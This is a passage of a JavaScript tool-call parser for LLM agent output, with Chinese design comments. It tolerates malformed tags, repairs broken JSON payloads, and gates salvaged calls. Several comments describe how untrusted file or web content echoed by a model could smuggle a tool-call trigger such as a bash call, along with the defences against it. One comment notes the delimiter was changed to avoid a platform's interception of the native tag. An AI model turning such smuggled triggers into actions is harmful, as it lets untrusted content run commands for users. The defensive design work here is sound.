const { generateUUID } = require('./tools.js');
const { logger } = require('./logger');
const {
  AGENT_FINAL_OPEN,
  AGENT_FINAL_CLOSE,
  AGENT_BLOCKED_OPEN,
  AGENT_BLOCKED_CLOSE,
  TOOL_CALL_OPEN,
  TOOL_CALL_CLOSE
} = require('./agent-turn.js');

// TOOL_CALL_OPEN / TOOL_CALL_CLOSE 从 agent-turn.js 引入：规范标记与重试提示必须锁步，
// 换分隔符的完整理由（Qwen 平台拦截原生 <tool_call>）也写在那里。

/**
 * 工具**结果**的分隔符。
 *
 * 历史：最早是 `<tool_response tool_call_id="…" name="…">` —— 和当时的调用标签 `<tool_call`
 * 共享前缀，还是个带属性的 HTML 元素，模型每一轮都能看见它，于是把它的形状学到调用标签上，
 * 产出 `<tool_call_id_1>`、`<tool_call name="read_file">`、`<tool_call_result>` 这一族坏标签。
 * 于是结果标记先改成了不带尖括号、不带属性的行标记 `[TOOL RESULT: …]`。
 *
 * 现在调用标记也是方括号行标记 `[TOOL CALL]`（为躲开 Qwen 平台对原生 `<tool_call>` 的拦截，
 * 见 agent-turn.js）。两者因此**共享 `[TOOL ` 前缀**，不再"完全不一样"。这不会造成解析冲突：
 * 调用触发器认的是 `tool[ _-]call`，结果标记是 `TOOL RESULT`，关键词不同，互不交叉匹配；
 * 名字又只能来自负载。残留的是模型可能把两者拼混（`[TOOL CALL RESULT]`），但拼出来的东西
 * 要么命中调用触发器（照常从负载恢复），要么谁都不命中（当正文放行），风险远低于当年那一族。
 */
const TOOL_RESULT_OPEN = '[TOOL RESULT: ';
const TOOL_RESULT_CLOSE = '[END TOOL RESULT]';

/**
 * 触发器：一个“像 tool_call”的开标签。它不再需要写对。
 *
 * 模型几乎每次都把标签写坏 —— `<tool_call\n>`、`<tool_call">`、`<tool_call=`、
 * `<tool_call type="function">`、`<tool_call_id_1>`、`<tool_call name="read_file">` ——
 * 却几乎每次都把标签后面的 JSON 负载写对（149 段真实抓包里只出现过一次干净的开标签）。
 * 而且它**静默**失败：标签对不上时 hasParseError() 仍是 false，没有错误也没有日志，
 * 于是没有重试、没有记录，调用方只收到一段裸 XML。工具名写错查得出来，标签写错查不出来。
 *
 * 所以识别拆成两段：
 *   1) 触发器只负责**定界**，长度有上界；
 *   2) 调用从触发器之后 TOOL_CALL_PAYLOAD_WINDOW 个字符内的 JSON 负载里恢复。
 *
 * 触发器**收窄**注入面，但并不封闭它。不要在任何地方声称这里防住了注入：模型复述回来的
 * 不可信内容（一个文件、一段网页）自己就可以带上一个触发器。真正扛住边界的是另外两条，
 * 两条都在语料上量过代价：
 *   1) 工具名只能来自负载的 name 键，**绝不**来自触发器尾巴。代价：159 段里 2 段。
 *      —— 否则 `<tool_call bash>{"cmd":"…"}` 这种从文件内容里抄回来的片段会真的执行。
 *   2) 触发器必须是可见回答里第一个非空白内容 —— 这本来就是提示词对模型的要求。
 *      代价：159 段里 8 段。
 * 即便如此，破坏性工具的确认权仍然在客户端那边，不在这里。
 *
 * 触发器同时还是缓冲区的上界：无触发器的自由扫描必须先缓冲一个任意长的对象才能判断，
 * chunk 边界暂存区随之失去上界。
 *
 * 实测（85 段带触发器的抓包回合）：精确标签 49%；无触发器的自由扫描 90%，但边界和上界
 * 全丢；触发器 + 负载 95%。只有去掉触发器才救得回来的回合：0 段。
 *
 * 只影响**读取**。foldToolMessages 回写历史时使用规范形式 [TOOL CALL]。
 */
// 两个头都认：方括号是规范形式，尖括号是模型 RL 惯性下仍可能吐出的旧原生形式。
// 旧形式被平台拦截时我们本来就收不到；漏网的那些照旧回收。
//
// 这里**不**用否定环视去甩掉 `[tool calls](url)` 这类 Markdown 链接：环视要往后看几十个字符，
// 而流式解析器在 chunk 边界上看到的是半截 `[tool calls]`（'(' 还没到），环视据此提前放行，
// 于是整段和流式两条路径对同一输入给出不同结果 —— 分歧比误报本身更糟。改为在**定界点**判断
// （isMarkdownLinkTail），那时两条路径都已经拿到了触发器到负载之间的完整 tail。
const TOOL_CALL_TRIGGER_RE = /<[ \t]{0,4}tool_calls?|\[[ \t]{0,4}tool[ \t_-]{1,2}calls?/i;

// 触发器到负载之间允许的最大间隔。中位数 3、最大 49、128 上界 —— 这些数字全部量自
// **尖括号**语料（149 段抓包），方括号形式还没有对应的语料。沿用是合理默认：方括号是
// 我们自己教给模型、要求写干净的形式，装饰理应更少而不是更多。真要偏离，得先抓一批
// [TOOL CALL] 的真实输出再调，别凭感觉动这个 128。
const TOOL_CALL_PAYLOAD_WINDOW = 128;

/** 触发器能匹配到的最长文本，用作 chunk 边界暂存区的上界。取两种形式里更长的那个。 */
const TOOL_CALL_TRIGGER_MAX = Math.max(
  '<    tool_calls'.length,
  '[    tool  calls'.length
);

/**
 * 闭标签同样会被写坏（`</tool_call">`、`</tool_call result>`），而且常和开标签不对称。
 * 它不携带任何信息，唯一的用处是别把它当正文吐出去，所以只用来**吞掉**，并且有上界。
 */
// 闭标签也会被写坏：`</tool_call">`、`</tool_call\n>`、`</tool_call result>`、
// `</tool_call_id_1>`、`</tool_call＞`（中文输入法的全角尖括号）。
//
// 尾巴必须收得很紧。之前用 `[^<>＞]{0,64}` 太松：`</tool_call and then 5 > 3` 里那个 '>'
// 让它一口吞掉 24 个字符的**真实回答**。现在只允许「一段不含空白的碎片 + 至多一个单词」，
// 多词散文因此匹配不上，宁可让闭标签泄漏，也绝不吃掉模型的回答。
const TOOL_CALL_CLOSE_RE =
  /^<[ \t]{0,4}\/[ \t]{0,4}tool_calls?[^\s<>＞]{0,16}[ \t\r\n]{0,4}(?:[A-Za-z_][\w-]{0,15})?[ \t\r\n]{0,4}[>＞]/i;
const TOOL_CALL_CLOSE_BARE_RE = /^<[ \t]{0,4}\/[ \t]{0,4}tool_calls?/i;
// 方括号闭标记：`[END TOOL CALL]` 是规范形式，`[/TOOL CALL]` 是可预期的变体。
// 与尖括号闭标签同一条纪律：只用来吞掉、有上界、多词散文匹配不上。
// `[TOOL RESULT: …]` 既没有 END 也没有 '/'，按构造匹配不上 —— 模型伪造的结果块
// 不会被当成闭标记吃掉。
// 装饰段同时排除 '[' 和 ']'：consumeTrailingCloser 的 grow 判据把内部的 '['
// 当成"这段永远成不了闭标记"的证据（`!slice.includes('[', 1)`），正则这一半也必须认同，
// 否则 `[END TOOL CALL[[[]` 在正则里算闭标记、在 grow 判据里不算，两半自相矛盾。
const TOOL_CALL_CLOSE_BRACKET_RE =
  /^\[[ \t]{0,4}(?:END[ \t_-]{1,2}|\/[ \t]{0,4})TOOL[ \t_-]{1,2}CALLs?[^\s[\]]{0,16}[ \t\r\n]{0,4}\]/i;
const TOOL_CALL_CLOSE_BRACKET_BARE_RE =
  /^\[[ \t]{0,4}(?:END[ \t_-]{1,2}|\/[ \t]{0,4})TOOL[ \t_-]{1,2}CALLs?/i;
// 上界是两种闭标记里更长的那个。两个都是手写的镜像字面量，必须和上面的正则**用眼睛**保持
// 同步 —— 这是这种写法的固有风险。当前方括号臂（63）其实盖过尖括号臂（58），而方括号闭标记
// 最长也就 42 个字符，本来就落在任一臂之下；也就是说方括号那个字面量此刻是冗余的安全垫，
// 就算它写短了也咬不出 bug（除非有人把两个臂同时改短到 42 以下）。真要收紧成一个精确不变式，
// 得把常量导出、在测试里断言"正则匹配长度 ≤ MAX"。
const TOOL_CALL_CLOSE_MAX = Math.max(
  '</    tool_calls'.length + 42,
  '[    END  TOOL  CALLS'.length + 42
);

/**
 * 触发之后允许缓冲的上限。头部注释说触发器给缓冲区封了顶，但那只对「窗口里找不到负载」
 * 成立：一旦找到 '{'，配平括号会一直等下去，一个永远配不平的 '{' 能把整条流吃进内存。
 *
 * 这里**不是**窗口的小倍数：write_file 之类的调用会把整份文件正文放进 arguments，几 KB
 * 到几百 KB 都算正常，按 1024 封顶会砍掉真实调用。1 MiB 远高于任何合理的工具参数，
 * 同时把「无界增长」变成有界失败。
 */
const TOOL_CALL_SPAN_MAX = 1024 * 1024;

/**
 * 「泄漏的调用负载」的形状谓词：开头（允许前导空白）就是一个 JSON 对象，且
 * "name" / "arguments" 两个键出现在**这个对象自己**的范围里。普通 JSON 答案
 * （缺任一键，或键在别处）不会误伤。
 *
 * 作用域是刻意收紧的：
 * - 对象已配平 → 键必须在对象文本之内。早先“全文任意位置”的版本会被后文一个
 *   真调用负载里的键点着，把 `{"result":…}` 这种普通 JSON 答案误当成抢救候选。
 * - 尚未配平（流式判定中）→ 键在已见文本里找，但 "name" 必须出现在开头 256 字符
 *   之内（LEAKED_PAYLOAD_NAME_WINDOW）。所有真实泄漏样本都以 name 开头；这个窗口
 *   让流式的扣留判定有界 —— 一个普通的大 JSON 答案最多被扣 256 字符就恢复流式。
 *
 * 单一来源：残渣检测（containsOrphanProtocolResidue，决定 malformed_protocol 重试）
 * 和合成开端（matchToolCallOpening，决定要不要试着抢救成真调用）都消费**这一个**
 * 谓词。两边一旦各自维护一份，就会出现“检测说是泄漏、抢救说不是”的缝隙 ——
 * 泄漏永远卡在重试环里。不要复制，不要内联。
 */
const LEAKED_PAYLOAD_NAME_RE = /"name"\s*:/;
const LEAKED_PAYLOAD_ARGS_RE = /"arguments"\s*:/;
const LEAKED_PAYLOAD_NAME_WINDOW = 256;
const isLeakedToolPayloadShape = (value) => {
  const trimmed = String(value || '').trimStart();
  if (!trimmed.startsWith('{')) return false;
  const object = extractBalancedObject(trimmed, 0);
  const scope = object ? object.text : trimmed;
  return LEAKED_PAYLOAD_NAME_RE.test(scope.slice(0, LEAKED_PAYLOAD_NAME_WINDOW)) &&
    LEAKED_PAYLOAD_ARGS_RE.test(scope);
};

/**
 * 记录正文当前是否处在代码上下文里。文档里的例子必须保持是例子：``` 围栏内，
 * 或同一行反引号数为奇数（行内代码）时，触发器不算触发器。
 * 增量式：只喂**已经放行**的正文，所以流式和整段两条路径可以共用同一套判断。
 */
const createCodeContextTracker = () => {
  let inFence = false;
  let ticksOnLine = 0;
  let run = 0;
  let runAtLineStart = true;   // 这串反引号前面，本行是不是只有空白
  let lineIsBlank = true;      // 本行到目前为止是不是只有空白

  // 围栏必须**顶行**（Markdown 的规则）。之前任何位置的三连反引号都会翻转围栏状态，
  // 于是 JSON 字符串里的 ``` 也算围栏；一旦错位就再也回不来，后面每个真实调用都被
  // 当成文档静默丢掉 —— 正是这次要消灭的那类无声失败。
  const settle = () => {
    if (run === 0) return;
    if (run >= 3 && runAtLineStart) {
      inFence = !inFence;
      ticksOnLine = 0;
    } else if (!inFence) {
      ticksOnLine += run;
    }
    run = 0;
  };

  return {
    consume: (text) => {
      for (let i = 0; i < text.length; i += 1) {
        const char = text[i];
        if (char === '`') {
          if (run === 0) runAtLineStart = lineIsBlank;
          run += 1;
          lineIsBlank = false;
          continue;
        }
        settle();
        if (char === '\n') {
          ticksOnLine = 0;
          lineIsBlank = true;
        } else if (char !== ' ' && char !== '\t' && char !== '\r') {
          lineIsBlank = false;
        }
      }
    },
    // 反引号可能被切在 chunk 边界上，所以这里结算一份副本，不能动真状态。
    inCode: () => {
      const fenceToggles = run >= 3 && (run === 0 ? lineIsBlank : runAtLineStart);
      const fence = fenceToggles ? !inFence : inFence;
      if (fence) return true;
      const ticks = fenceToggles ? 0 : ticksOnLine + run;
      return ticks % 2 === 1;
    }
  };
};

/**
 * 从 start 处的 '{' 开始做括号配平；字符串内部的括号不参与配平。
 * @returns {{ text: string, end: number }|null} null 表示还没闭合
 */
const extractBalancedObject = (text, start) => {
  let depth = 0;
  let inString = false;
  let escaped = false;
  for (let i = start; i < text.length; i += 1) {
    const char = text[i];
    if (inString) {
      if (escaped) escaped = false;
      else if (char === '\\') escaped = true;
      else if (char === '"') inString = false;
      continue;
    }
    if (char === '"') inString = true;
    else if (char === '{') depth += 1;
    else if (char === '}') {
      depth -= 1;
      if (depth === 0) return { text: text.slice(start, i + 1), end: i + 1 };
    }
  }
  return null;
};

/**
 * 触发器到负载之间的 tail 若长成 Markdown 链接的收尾（`](`），这就不是调用而是链接：
 * `[tool calls](https://…) … {json}`。真正的方括号调用 `[TOOL CALL]\n{…}` 的 tail 是 `]\n`，
 * 不含 `](`。只对方括号触发器判断（尖括号形式不会撞上 Markdown 链接语法）。
 * @param {string} triggerText 触发器原文（用来区分方括号 / 尖括号形式）
 * @param {string} tail 触发器结尾到负载 '{' 之间的文本
 * @returns {boolean}
 */
const isMarkdownLinkTail = (triggerText, tail) =>
  triggerText.charAt(0) === '[' && /\]\(/.test(tail);

/**
 * 触发器之后、窗口之内第一个 '{' 的下标。
 * @returns {number} >=0 负载起点；-1 窗口内没有负载；-2 还没看满窗口，需要更多输入
 */
const findPayloadStart = (text, from, canGrow) => {
  const limit = Math.min(text.length, from + TOOL_CALL_PAYLOAD_WINDOW);
  for (let i = from; i < limit; i += 1) {
    if (text[i] === '{') return i;
  }
  if (canGrow && text.length - from < TOOL_CALL_PAYLOAD_WINDOW) return -2;
  return -1;
};

/**
 * 找回答里的下一个调用开端。正则触发器优先；找不到时考虑**合成开端**：
 * 实测泄漏（2026-08-31 10:12–10:17）里模型把开标记整个吞掉，答案直接以
 * `{"name":…,"arguments":…}` 负载开头再跟 `[END TOOL CALL]` —— 没有触发器可点火，
 * 整段作为正文流向客户端。合成开端让这种负载重新进入解析管线，由后续闸门
 * （JSON 配平、强制闭标记、名字白名单）决定它是不是调用。
 *
 * 位置门在这里：只有「此前没有任何非空白正文」（emittedProse=false —— 回答开头，
 * 或紧跟上一个已完成的调用，中间只有空白）且眼前第一个非空白字符是 '{'、整段
 * 文本满足 isLeakedToolPayloadShape 时才产生合成开端。调用方把代码上下文
 * （code.inCode()）并进 emittedProse 传入 —— 围栏/行内代码里的负载永远是文档。
 *
 * 合成开端按位置优先于更靠后的正则触发器：两条解析路径（整段 / 流式）都是从左
 * 到右消费，流式在正则触发器抵达之前就已经看见了开头的负载；谁在前谁生效才能
 * 保证两条路径对同一份文本给出同一个结果。合法的合成开端前面只有空白，正则
 * 触发器不可能匹配到它前面去，所以这条规则等价于「合成开端存在即生效」。
 *
 * canSalvage 默认关闭（fail closed）：没有**非空**的 allowedToolNames 白名单时
 * 名字闸门是放行一切的旧语义，抢救会给未声明的名字捏出 tool_use —— 所以无白名单
 * 就无抢救。正则触发器不受影响（旧行为保持）。
 * @param {string} text - 待扫描文本（从当前位置起）
 * @param {{ emittedProse?: boolean, canSalvage?: boolean }} [options]
 * @returns {{ index: number, text: string, synthetic: boolean }|null}
 */
const matchToolCallOpening = (text, { emittedProse = false, canSalvage = false } = {}) => {
  const match = text.match(TOOL_CALL_TRIGGER_RE);
  if (canSalvage && !emittedProse) {
    const braceAt = text.search(/\S/);
    if (braceAt !== -1 && text[braceAt] === '{' &&
        (!match || braceAt < match.index) &&
        isLeakedToolPayloadShape(text)) {
      return { index: braceAt, text: '', synthetic: true };
    }
  }
  if (match) return { index: match.index, text: match[0], synthetic: false };
  return null;
};

/**
 * 负载被 ```json 围栏包起来时，把收尾的那道围栏也吞掉。
 * 只在触发器和负载之间确实出现过围栏时才吞 —— 否则孤零零的收尾围栏会漏进正文，
 * 还会把 createCodeContextTracker 翻转，让这一整条回复后面的触发器全被当成文档。
 * @returns {number} 跳过围栏之后的下标
 */
const skipTrailingFence = (text, from, tail, canGrow) => {
  if (!tail.includes('```')) return { end: from, needMore: false };
  let index = from;
  while (index < text.length && /\s/.test(text[index])) index += 1;
  if (index >= text.length) return { end: from, needMore: !!canGrow };
  if (text[index] !== '`') return { end: from, needMore: false };
  // 流式下可能只收到一两个反引号：分不清“不是围栏”和“还没收够”，就得等。
  // 不等的话围栏残片会当成正文放出去，emittedProse 被置位，后面那个干净的调用
  // 就被“触发器必须是第一个内容”挡掉 —— 整段路径拿 2 个调用，流式只拿 1 个。
  let ticks = 0;
  while (index + ticks < text.length && text[index + ticks] === '`') ticks += 1;
  if (ticks < 3) {
    if (canGrow && index + ticks >= text.length) return { end: from, needMore: true };
    return { end: from, needMore: false };
  }
  return { end: index + ticks, needMore: false };
};

/**
 * 负载后面可能还跟着一个（同样写坏了的）闭标签，吞掉它，否则它会作为正文泄漏。
 * @returns {{ end: number, needMore: boolean }} end === from 表示没有闭标签
 */
const consumeTrailingCloser = (text, from, canGrow) => {
  let index = from;
  while (index < text.length && /\s/.test(text[index])) index += 1;
  if (index >= text.length) return { end: from, needMore: !!canGrow };
  const head = text[index];
  if (head !== '<' && head !== '[') return { end: from, needMore: false };
  const slice = text.slice(index, index + TOOL_CALL_CLOSE_MAX);
  const match = slice.match(head === '<' ? TOOL_CALL_CLOSE_RE : TOOL_CALL_CLOSE_BRACKET_RE);
  if (match) return { end: index + match[0].length, needMore: false };
  // `</too` / `[END TO` 还可能长成一个闭标记，`<div>` / `[note]` 不会。
  const terminator = head === '<'
    ? (!slice.includes('>') && !slice.includes('＞') && !slice.includes('<', 1))
    : (!slice.includes(']') && !slice.includes('[', 1));
  if (canGrow && slice.length < TOOL_CALL_CLOSE_MAX && terminator) {
    return { end: from, needMore: true };
  }
  // 流已经结束了：光秃秃的 `</tool_call` / `[END TOOL CALL` 后面什么都没有，那它就是闭标记。
  const bare = slice.match(head === '<' ? TOOL_CALL_CLOSE_BARE_RE : TOOL_CALL_CLOSE_BRACKET_BARE_RE);
  if (!canGrow && bare && !slice.slice(bare[0].length).trim()) {
    return { end: index + slice.length, needMore: false };
  }
  return { end: from, needMore: false };
};

/**
 * 合成开端的**强制**闭标记：负载配平之后必须紧跟一个方括号闭标记，之间只许空白。
 *
 * 这道门是抢救与注入之间的整条边界。裸负载本身在不可信内容里到处都是（一个配置
 * 文件、一段 README），写侧的 neutraliseResultMarkers 不会去动它 —— 改写负载形状
 * 会腐蚀结果里流过的合法 JSON。写侧动的是**闭标记**：折叠进历史的结果正文里，
 * 一切 `[END/／TOOL CALL` 的头字符都被换成 '('。所以「模型从结果里逐字引用回来的
 * 负载」永远凑不齐这里要求的闭标记，而「模型自己想调用却写坏了协议」的输出带着它。
 * 闭标记因此必须强制、必须紧邻（邻接规则）、必须是方括号形式 —— 三者都不许放松。
 *
 * 邻接规则的判定：配平点之后跳过空白；一旦出现既非空白、又不能开始闭标记（'['）
 * 的字符，立刻判负（found:false），调用方立即按正文放行。只有尾巴还是纯空白、
 * 或是一个仍可能长成闭标记的 '[' 前缀（上界 TOOL_CALL_CLOSE_MAX）时才等待更多输入。
 * @returns {{ end: number, needMore: boolean, found: boolean }}
 */
const consumeMandatoryBracketCloser = (text, from, canGrow) => {
  let index = from;
  while (index < text.length && /\s/.test(text[index])) index += 1;
  if (index >= text.length) return { end: from, needMore: !!canGrow, found: false };
  if (text[index] !== '[') return { end: from, needMore: false, found: false };
  const slice = text.slice(index, index + TOOL_CALL_CLOSE_MAX);
  const match = slice.match(TOOL_CALL_CLOSE_BRACKET_RE);
  if (match) return { end: index + match[0].length, needMore: false, found: true };
  const viable = !slice.includes(']') && !slice.includes('[', 1);
  if (canGrow && slice.length < TOOL_CALL_CLOSE_MAX && viable) {
    return { end: from, needMore: true, found: false };
  }
  // 流已结束：光秃秃的 `[END TOOL CALL`（少一个 ']'）后面什么都没有，那它就是闭标记。
  // 与 consumeTrailingCloser 同一条纪律；写侧的失效替换同样打掉它的头字符。
  // “后面什么都没有”查的是**真正的剩余文本**，不是 63 字符切片窗口 —— 只查窗口的话，
  // `[END TOOL CALL` + 一屏空白 + 真实正文也会被当成流尾裸闭标记，邻接边界被打穿。
  const bare = slice.match(TOOL_CALL_CLOSE_BRACKET_BARE_RE);
  if (!canGrow && bare && !text.slice(index + bare[0].length).trim()) {
    return { end: text.length, needMore: false, found: true };
  }
  return { end: from, needMore: false, found: false };
};

/**
 * flush 专用：closerSwallow 状态下，流死在半个**重复**闭标记上（`[END TOOL C` + EOF）。
 * 只认规范拼写的字面前缀（大小写不敏感，空格/下划线/连字符三种分隔，至少 1 个字符）；
 * 判不准宁可当正文放行 —— 吞掉真实回答比漏出半个标记更糟。
 * @param {string} value - flush 时 pendingText 从第一个非空白字符起的尾巴
 * @returns {boolean}
 */
const CLOSER_PREFIX_LITERALS = [
  'END TOOL CALLS', 'END_TOOL_CALLS', 'END-TOOL-CALLS',
  '/TOOL CALLS', '/TOOL_CALLS', '/TOOL-CALLS'
];
const isDanglingCloserPrefix = (value) => {
  const match = value.match(/^([[<])[ \t]{0,4}([^\r\n]*)$/);
  if (!match) return false;
  const rest = match[2].toUpperCase();
  if (rest.length === 0 || rest.length > TOOL_CALL_CLOSE_MAX) return false;
  return CLOSER_PREFIX_LITERALS.some(literal => literal.startsWith(rest));
};

/**
 * 任何调用（常规或合成）收尾之后，把**重复**的闭标记一并吞掉：实测泄漏 #2 的模型
 * 连写两个 `[END TOOL CALL]`，第二个作为孤儿闭标记漏进正文，又点着 malformed_protocol
 * 的残渣检测。只吞「已经能判定是闭标记」的重复：尾巴是纯空白时立刻停下（绝不等待 ——
 * 否则每个后面跟换行的调用都要压到 flush 才能发出）；needMore 仅在缓冲里躺着一个
 * 还没长全的闭标记前缀时为真。
 * @returns {{ end: number, needMore: boolean }}
 */
const consumeDuplicateClosers = (text, from, canGrow) => {
  let end = from;
  for (;;) {
    let probe = end;
    while (probe < text.length && /\s/.test(text[probe])) probe += 1;
    if (probe >= text.length) return { end, needMore: false };
    const head = text[probe];
    if (head !== '[' && head !== '<') return { end, needMore: false };
    const dup = consumeTrailingCloser(text, end, canGrow);
    if (dup.needMore) return { end, needMore: true };
    if (dup.end === end) return { end, needMore: false };
    end = dup.end;
  }
};

const firstNonEmptyString = (...values) =>
  values.find(value => typeof value === 'string' && value.length > 0) || null;

/**
 * 控制字符修复：把 JSON **字符串字面量内部**的裸 C0 控制字符转义掉。
 *
 * 实测（2026-08-31 13:36）：模型把多行文本原样塞进 arguments 的字符串里 —— 裸换行、
 * 裸制表符 —— 严格解析当场死于 "Bad control character in string literal"。这是一类
 * 确定性、可修复的模型故障：字符串里的裸 C0 在合法 JSON 中**不可能**出现，转义它
 * 不存在语义歧义。修复严格限于这一类 —— 单引号、尾随逗号、Python 常量一概不修
 * （没有语料证据，且有语义风险；也绝不引入 jsonrepair 之类的宽松解析依赖）。
 *
 * 只在严格 JSON.parse 失败之后调用（buildToolCallPayload 的 catch 里）：合法负载
 * 永远不经过这里，构造上就不可能被改动。字符游走的状态机与 extractBalancedObject
 * 同一套纪律：尊重反斜杠转义，只在 inString 状态下动手。
 * @param {string} jsonText - 严格解析失败的 JSON 文本
 * @returns {string|null} 修复后的文本；没有任何可修复字符时返回 null
 */
const escapeRawControlCharsInStrings = (jsonText) => {
  const text = String(jsonText);
  let out = '';
  let inString = false;
  let escaped = false;
  let repaired = false;
  for (let i = 0; i < text.length; i += 1) {
    const char = text[i];
    if (inString) {
      if (escaped) {
        escaped = false;
        out += char;
        continue;
      }
      if (char === '\\') {
        escaped = true;
        out += char;
        continue;
      }
      if (char === '"') {
        inString = false;
        out += char;
        continue;
      }
      const code = char.charCodeAt(0);
      if (code <= 0x1f) {
        repaired = true;
        if (char === '\n') out += '\\n';
        else if (char === '\r') out += '\\r';
        else if (char === '\t') out += '\\t';
        else out += `\\u${code.toString(16).padStart(4, '0')}`;
        continue;
      }
      out += char;
      continue;
    }
    if (char === '"') inString = true;
    out += char;
  }
  return repaired ? out : null;
};

/**
 * 引号修复：把负载里**没加引号的键**和**丢了开引号的字符串值**补上引号。
 *
 * 实测（2026-08-31 16:39，事故 3）：模型写出 `{command:find … 2>/dev/null", "description": …}`
 * —— 键没有引号，值丢了开引号但**留着闭引号**。引号奇偶被打破后 extractBalancedObject
 * 永远配不平，整段按 truncated_tool_call 死掉，残渣泄漏给客户端。
 *
 * 修复是确定性的、绝不重塑内容：
 * - 键位置的裸标识符加引号（`command:` → `"command":`）。
 * - 值位置的裸内容开一个引号，**复用文本里已有的下一个 `"` 作闭引号**；没有现成
 *   闭引号时字符串不闭合，严格解析当场拒绝 —— 绝不猜测值在哪里结束。
 * - 裸区间内的反斜杠与 C0 控制字符按 JSON 规则转义：字节必须原样往返，
 *   `C:\foo` 绝不能解析成带换页符的另一条命令。
 * - `true`/`false`/`null` 仅在后面**紧跟分隔符**（空白 / `,` / `}` / `]`）时算字面量，
 *   否则按裸字符串起点处理（`find …` 以 f 开头，绝不能吞成 false）。
 * - 数字按完整 token 放行（`1.5` 不能在小数点处被劈成两截）。
 *
 * 与 escapeRawControlCharsInStrings 同一套 in-string 状态机纪律，不新增第四种扫描
 * 风格。修复产物必须再过严格 JSON.parse + 白名单 + schema 三道闸门（见
 * buildToolCallPayload / salvageTruncatedSpan），任何一道不过就回到今天的错误路径。
 * 没有任何可修复点时返回 null（合法 JSON 是不动点）。
 * @param {string} jsonText - 严格解析失败的 JSON 文本
 * @returns {string|null}
 */
const repairLooseToolPayload = (jsonText) => {
  const text = String(jsonText);
  let out = '';
  let repaired = false;
  let inString = false;
  let escaped = false;
  let inLoose = false;
  const stack = [];
  let expectKey = false;

  const literalLengthAt = (i) => {
    const match = text.slice(i, i + 6).match(/^(true|false|null)/);
    if (!match) return 0;
    // 输入结束也算分隔符：截断的 `{a:true` 里 true 仍是字面量，不能被降格成裸字符串。
    const next = text[i + match[1].length];
    return (next === undefined || next === ',' || next === '}' || next === ']' ||
        next === ' ' || next === '\t' || next === '\r' || next === '\n')
      ? match[1].length
      : 0;
  };

  for (let i = 0; i < text.length; i += 1) {
    const char = text[i];
    if (inString) {
      if (escaped) escaped = false;
      else if (char === '\\') escaped = true;
      else if (char === '"') inString = false;
      out += char;
      continue;
    }
    if (inLoose) {
      // 裸值提升成字符串：复用下一个现成的 '"' 作闭引号；区间内按 JSON 规则转义。
      if (char === '"') {
        inLoose = false;
        out += char;
        continue;
      }
      if (char === '\\') {
        out += '\\\\';
        continue;
      }
      const code = char.charCodeAt(0);
      if (code <= 0x1f) {
        if (char === '\n') out += '\\n';
        else if (char === '\r') out += '\\r';
        else if (char === '\t') out += '\\t';
        else out += `\\u${code.toString(16).padStart(4, '0')}`;
        continue;
      }
      out += char;
      continue;
    }
    if (char === '"') {
      inString = true;
      out += char;
      continue;
    }
    if (char === '{') {
      stack.push('{');
      expectKey = true;
      out += char;
      continue;
    }
    if (char === '[') {
      stack.push('[');
      expectKey = false;
      out += char;
      continue;
    }
    if (char === '}' || char === ']') {
      stack.pop();
      expectKey = false;
      out += char;
      continue;
    }
    if (char === ',') {
      expectKey = stack[stack.length - 1] === '{';
      out += char;
      continue;
    }
    if (char === ':') {
      expectKey = false;
      out += char;
      continue;
    }
    if (char === ' ' || char === '\t' || char === '\r' || char === '\n') {
      out += char;
      continue;
    }
    if (expectKey) {
      const ident = text.slice(i).match(/^[A-Za-z_$][\w$-]*/);
      if (ident) {
        out += `"${ident[0]}"`;
        i += ident[0].length - 1;
        expectKey = false;
        repaired = true;
        continue;
      }
      // 不是标识符：原样放行，让严格解析拒绝。
      out += char;
      continue;
    }
    if (char === '-' || (char >= '0' && char <= '9')) {
      const num = text.slice(i).match(/^-?\d+(?:\.\d+)?(?:[eE][+-]?\d+)?/);
      if (num) {
        out += num[0];
        i += num[0].length - 1;
        continue;
      }
    }
    const literalLen = literalLengthAt(i);
    if (literalLen > 0) {
      out += text.slice(i, i + literalLen);
      i += literalLen - 1;
      continue;
    }
    // 值位置的裸内容：开引号进入 loose 态，当前字符重走一遍（进上面的转义逻辑）。
    out += '"';
    inLoose = true;
    repaired = true;
    i -= 1;
  }
  return repaired ? out : null;
};

/**
 * 触发器尾巴上的名字提示。事故 3 的形态：`[TOOL_CALL]Bash{…}` —— 触发器正则吃掉
 * `[TOOL_CALL`，尾巴是 `]Bash`，真正的工具名骑在触发器和负载之间。
 *
 * 「名字只能来自负载」的铁律（见 buildToolCallPayload 头注释）在这里有一个**受闸门
 * 保护的例外**：尾巴名字只作为 hint 携带，只有在（1）负载缺 name 信封、（2）hint 在
 * 非空白名单里、（3）修复后 arguments 的每个顶层键都在该工具声明的
 * input_schema.properties 里，三条全部成立时才被采用（见 gateSalvagedPayload）。
 * 不可信内容抄回来的 `<tool_call bash>` 过不了这三连闸门；判不满足就回到今天的
 * 错误路径，绝不执行。只认方括号触发器（尖括号形态不携带 `]`）；尾巴除名字外只许空白。
 * @param {string} triggerText - 触发器原文
 * @param {string} tail - 触发器结尾到负载 '{' 之间的文本
 * @returns {string|null}
 */
const NAME_HINT_TAIL_RE = /^\][ \t]*([A-Za-z_][\w-]{0,63})[ \t\r\n]*$/;
const extractTriggerNameHint = (triggerText, tail) => {
  if (!triggerText || triggerText.charAt(0) !== '[') return null;
  const match = String(tail || '').match(NAME_HINT_TAIL_RE);
  return match ? match[1] : null;
};

/**
 * 抢救的 schema 闸门：修复后 arguments 的每个顶层键都必须出现在该工具声明的
 * input_schema.properties 里，**且** schema 声明的每个 required 键都必须在场
 * （frozen Always，review loop 1）——空 `{}` 对带 required 的 schema 不算"空过"，
 * 抢救绝不发射缺必填参数的 tool_use。误修复把一个值劈成幻影键时，幻影键不在
 * schema 里 —— 拒绝；schema 缺席（调用方没传、工具没声明 properties、arguments
 * 不是普通对象）一律拒绝（fail closed）。确定性抢救绝不执行被重塑过的命令：
 * 这道闸门就是那句承诺的机制。toolSchemas 是普通对象（anthropic.js 用
 * Object.create(null) 构造，工具名来自请求方，不能让 __proto__ 之类的名字碰
 * 原型链）。
 */
const argumentsMatchToolSchema = (name, args, toolSchemas) => {
  if (!toolSchemas || typeof toolSchemas !== 'object') return false;
  if (!Object.prototype.hasOwnProperty.call(toolSchemas, name)) return false;
  const schema = toolSchemas[name];
  const properties = schema?.properties;
  if (!properties || typeof properties !== 'object') return false;
  if (!args || typeof args !== 'object' || Array.isArray(args)) return false;
  if (!Object.keys(args).every(key => Object.prototype.hasOwnProperty.call(properties, key))) {
    return false;
  }
  const required = Array.isArray(schema.required) ? schema.required : [];
